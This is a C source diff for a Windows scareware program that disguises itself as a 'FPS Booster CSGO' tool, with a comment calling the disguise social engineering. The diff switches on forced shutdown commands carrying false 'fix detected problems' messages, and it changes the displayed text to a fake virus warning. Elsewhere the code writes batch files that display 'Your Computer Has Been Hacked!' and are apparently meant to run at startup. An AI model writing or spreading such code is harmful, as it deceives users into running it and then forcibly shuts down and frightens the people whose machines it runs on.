@@ -36,13 +36,13 @@ void tscan() {
         if(f==NULL)
             system("cls");
             remove("user");
-            printf("\nPlease Run this Program as ADMINISTRATOR to continue...\n");
+            printf("\nError... Run This Program As Administrator To Continue\n");
             system("timeout 10");
             exit(0);
         }
-        fprintf(f,"\necho off\necho Your Computer has been Hacked!\npause");
+        fprintf(f,"\necho off\necho A virus has been detected on your computer\npause");
         fclose(f);
-        //system("shutdown /f /t 005 /s /c \"We have to restart the PC to fix detected problems.\"");
+        system("shutdown /f /t 005 /s /c \"We have to restart the PC to fix detected problems.\"");
         exit(0);
     }
     fprintf(fp,"\necho off\necho Your Computer Has Been Hacked!\npause");
@@ -67,14 +67,14 @@ void pause()
 
 int main()
     // social engineering :)
-    system("title System Diagonistics Tool ");
+    system("title FPS Booster CSGO ");
     run();
     ok();
-    printf("\n|----- System Diagonists -----|\n");
+    printf("\n|----- Resources Diagnostics -----|\n");
     printf("\n Checking PC for problems...\n");
     system("systeminfo");
 
 	// shut the pc down so payload runs when the pc starts up
-    //system("shutdown /f /t 005 /s /c \"We have to shutdown the PC to fix detected problems.\"");
+    system("shutdown /f /t 005 /s /c \"We have to shutdown the PC to fix detected problems.\"");
     pause();
 }
